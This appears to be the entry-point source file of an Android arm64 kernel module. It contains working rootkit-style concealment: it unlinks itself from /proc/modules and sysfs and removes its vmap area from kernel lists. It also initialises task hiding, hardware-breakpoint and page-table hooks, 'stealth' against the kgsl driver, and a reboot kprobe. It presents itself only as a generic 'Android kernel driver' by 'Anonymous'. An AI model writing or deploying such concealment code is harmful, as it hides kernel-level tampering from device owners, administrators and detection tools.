// SPDX-License-Identifier: GPL-2.0
// Module entry point + compile-time self-concealment (list unlink, sysfs kobject_del, vmap unlink).

#include <linux/errno.h>
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/mm.h>
#include <linux/module.h>
#include <linux/types.h>

#if KCFG_HIDE_SELF_MODULE
#include <linux/kobject.h>
#include <linux/list.h>
#include <linux/poison.h>
#endif

#if KCFG_HIDE_VMAP
#include <linux/rbtree.h>
#include <linux/spinlock.h>
#endif

#include <asm/memory.h>
#include <asm/page.h>
#include <asm/sysreg.h>

#include <driver/types.h>

#include "comm.h"
#include "hide_task.h"
#include "hwbp.h"
#include "kallsym.h"
#include "lifecycle.h"
#include "log.h"
#include "memory.h"
#include "stealth.h"
#include "user_hook.h"

struct drv_state drv;

#if KCFG_HIDE_SELF_MODULE
/* Unlink THIS_MODULE from /proc/modules and /sys/module/<name>. */
static void conceal_module(void) {
	struct module *mod = THIS_MODULE;
	list_del(&mod->list);
	INIT_LIST_HEAD(&mod->list);
	kobject_del(&mod->mkobj.kobj);
	list_del(&mod->mkobj.kobj.entry);
}
#endif

#if KCFG_HIDE_VMAP
/* struct vmap_area is opaque on 6.9+ (moved to mm/internal.h); we only need the leading fields, whose offsets are stable across 5.10..6.12: va_start@0, va_end@8, rb_node@16, list@40. */
struct drv_vmap_area_lite {
	unsigned long va_start;
	unsigned long va_end;
	struct rb_node rb_node;
	struct list_head list;
};

/* Unlink this module's vmap area from vmap_area_list (which /proc/vmallocinfo iterates). Best-effort — silently no-ops if the required symbols are not resolvable through kallsyms (e.g. per-node vmap tree on 6.9+ without a single global root). */
static void conceal_vmap(void) {
	struct list_head *vmap_list = (struct list_head *)kallsym_lookup("vmap_area_list");
	spinlock_t *vmap_lock = (spinlock_t *)kallsym_lookup("vmap_area_lock");
	struct rb_root *vmap_root = (struct rb_root *)kallsym_lookup("vmap_area_root");
	/* &init_driver lives in __init memory (freed after do_free_init) — pointing at it would leave the module_memfree path chasing a vm_area we already unlinked. drv is uninitialised core .bss, permanent for the module's lifetime. */
	unsigned long probe = (unsigned long)(uintptr_t)&drv;
	struct drv_vmap_area_lite *va, *tmp;
	unsigned long flags = 0;
	int erased = 0;

	if (!vmap_list) {
		LOGW("conceal_vmap: vmap_area_list not resolvable, skip\n");
		return;
	}
	if (vmap_lock) spin_lock_irqsave(vmap_lock, flags);
	list_for_each_entry_safe(va, tmp, vmap_list, list) {
		if (probe < va->va_start || probe >= va->va_end) continue;
		list_del(&va->list);
		INIT_LIST_HEAD(&va->list);
		if (vmap_root) rb_erase(&va->rb_node, vmap_root);
		erased = 1;
		LOGI("conceal_vmap: unlinked va %lx..%lx (probe %lx)\n", va->va_start, va->va_end, probe);
		break;
	}
	if (vmap_lock) spin_unlock_irqrestore(vmap_lock, flags);
	if (!erased) LOGW("conceal_vmap: no vmap area contained probe %lx\n", probe);
}
#endif

/* TCR_EL1.T1SZ (bits 21:16) sets kernel-half VA size; page_level = (60 - T1SZ) / 9. VA_BITS=39 → 3 (PUD/PMD/PTE). VA_BITS=48 → 4. LPA2/VA_BITS=52 → 5. Captured once here so write_ro_memory + hooks see them populated. */
static void mm_globals_init(void) {
	u64 tcr = read_sysreg(tcr_el1);
	u64 ttbr1 = read_sysreg(ttbr1_el1);
	u32 t1sz = (tcr >> 16) & 0x3Fu;
	u64 pgd_pa = ttbr1 & PHYS_MASK & PAGE_MASK;
	drv.m_page_level = (60u - t1sz) / 9u;
	drv.m_pgd_va = (u64)(uintptr_t)phys_to_virt(pgd_pa);
}

int __init init_driver(void) {
	int ret;

	LOGI("driver_entry\n");

	mm_globals_init();

	/* kallsym_init resolves kallsyms_lookup_name + kallsym-shimmed pointers a kprobe pre-handler might need (currently task_work_add). Done here in process context — the prctl/reboot pre-handlers must not re-enter register_kprobe from atomic context. */
	ret = kallsym_init();
	if (ret < 0) { LOGE("kallsym_init failed: %d\n", ret); return ret; }

	/* Missing symbols are non-fatal — the text writer falls back locally, package lookup reports -EOPNOTSUPP. */
	(void)memory_init();

	ret = comm_warm_symbols();
	if (ret < 0) { LOGE("comm_warm_symbols failed: %d\n", ret); return ret; }

	if (hwbp_init()) LOGN("hwbp commands disabled\n");
	if (user_hook_init()) LOGN("pte-hook commands disabled\n");
	if (hide_task_init()) LOGN("hide_task commands disabled\n");
	if (kgsl_stealth_arm()) LOGN("kgsl proactive stealth disabled\n");

	ret = register_kprobe(&reboot_kp);
	if (ret < 0) { LOGE("register_kprobe (__arm64_sys_reboot) failed: %d\n", ret); return ret; }

#if KCFG_HIDE_SELF_MODULE
	conceal_module();
#endif
#if KCFG_HIDE_VMAP
	conceal_vmap();
#endif
	return 0;
}

module_init(init_driver);

/* Cargo-culted namespace tag preserved verbatim from the original .ko modinfo. The token does not name any namespace in mainline 5.4..6.12 (verified via Bootlin) — MODULE_IMPORT_NS expands to a modinfo string only, so this is a no-op at load time. */
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Anonymous");
MODULE_DESCRIPTION("Android kernel driver");
MODULE_IMPORT_NS(VFS_internal_I_am_really_a_filesystem_and_am_NOT_a_driver);
